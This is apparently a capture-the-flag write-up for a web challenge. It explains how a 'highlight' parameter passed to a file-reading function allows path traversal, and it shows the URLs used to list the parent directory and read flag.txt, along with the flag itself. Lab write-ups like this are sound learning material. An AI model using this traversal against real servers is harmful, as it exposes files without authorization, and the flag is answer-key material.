# Pathological Liars

> Points: 150

> Category: Web

## Description

If at once you don't solve a challenge, ask your parents to solve it for you :D

## Attachments

https://pathological-liars.robinjadoul.repl.co/

## Solution

The ``get_content()`` function checks if the parameter passed through it is a file that exists on the server. If it is, it will read the file, and if not, it checks if it is a directory. If it is a directory, it will list what is inside.
The ``serve`` function gets the value of the **highlight** request arg and passes that through the ``get_content`` function.

We can explore the directories and their content by using **.** to list the files in the current dir, and **../** to go up a directory.

``https://pathological-liars.robinjadoul.repl.co/?highlight=../``

```
- .upm
- pyproject.toml
- poetry.lock
- src
- flag.txt
- main.py
```

``https://pathological-liars.robinjadoul.repl.co/?highlight=../flag.txt``

```
ictf{oh_your_parents_dont_have_a_flag?}
```

### Flag
> ictf{oh_your_parents_dont_have_a_flag?}
